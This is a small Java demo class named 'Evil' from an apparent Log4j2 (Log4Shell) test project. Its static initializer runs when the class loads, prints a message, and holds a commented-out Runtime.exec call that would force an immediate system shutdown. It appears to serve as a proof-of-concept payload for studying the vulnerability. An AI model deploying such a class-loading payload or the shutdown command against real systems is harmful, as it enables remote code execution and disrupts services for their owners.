package com.wky.demo.log4j2;

/**
 * @author: wangkunyang
 * @date 2021/12/13 10:48
 */
public class Evil {

    static {
        System.out.println("invoked...");
        Runtime runtime = Runtime.getRuntime();
//        try {
//            runtime.exec("shutdown -s -t 00");
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
    }

}
